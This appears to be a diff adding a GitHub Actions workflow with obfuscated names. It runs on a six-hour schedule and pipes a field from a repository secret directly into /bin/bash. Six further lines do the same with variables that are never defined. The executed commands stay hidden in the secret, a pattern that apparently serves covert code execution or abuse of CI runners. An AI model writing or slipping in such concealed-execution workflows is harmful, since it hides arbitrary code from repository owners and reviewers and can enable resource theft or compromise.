@@ -1,0 +1,24 @@
+name: bainende1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bainende1234
+        env:
+          mag17: ${{ secrets.mag17 }}
+        run: |
+          echo $mag17 | jq -r .ii92233 | /bin/bash
+          echo $d61743 | jq -r .v10 | /bin/bash
+          echo $lcr8 | jq -r .gi2871 | /bin/bash
+          echo $okvb69467 | jq -r .liprm722 | /bin/bash
+          echo $ppwh4 | jq -r .inc4460 | /bin/bash
+          echo $yjes7 | jq -r .gag821 | /bin/bash
+          echo $qyf8 | jq -r .vtqt450 | /bin/bash
+
